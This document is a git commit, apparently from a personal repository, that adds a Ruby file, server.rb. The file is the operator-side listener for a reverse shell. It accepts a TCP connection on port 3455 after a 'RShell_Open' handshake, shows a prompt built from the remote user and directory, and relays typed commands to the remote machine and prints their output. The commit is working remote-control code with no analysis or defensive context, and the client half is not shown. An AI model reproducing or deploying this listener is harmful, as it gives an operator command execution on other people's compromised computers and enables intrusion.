6cbc730fbc0f24d749ca0907c6c7e55cc0714217
Matthias Lee <matthiasclee09@gmail.com>
2021-12-18 19:06:22 -0800

    Add files via upload

---
+++ server.rb
@@ -0,0 +1,31 @@
+require "socket"
+
+host = "0.0.0.0"
+port = 3455
+
+server = TCPServer.new(host, port)
+puts "Listening on #{host}:#{port.to_s}"
+thr = Thread.new do
+	client = server.accept
+	if client.gets.chomp == "RShell_Open"
+		currentDirCommand = client.gets
+		sock_domain, remote_port, remote_hostname, remote_ip = client.peeraddr
+		loop do
+			client.puts "whoami"
+			whoami = client.gets.gsub("\\NEWLINE", "\n").chomp.chomp
+			client.puts currentDirCommand
+			cd = client.gets.gsub("\\NEWLINE", "\n").chomp.chomp
+			print "#{whoami}@#{remote_ip}:#{cd}> "
+			cmd = gets.chomp
+			client.puts cmd
+			if cmd.downcase == "exit"
+				exit
+			end
+			puts client.gets.gsub("\\NEWLINE", "\n").chomp
+		end
+	else
+		client.close
+	end
+end
+
+thr.join
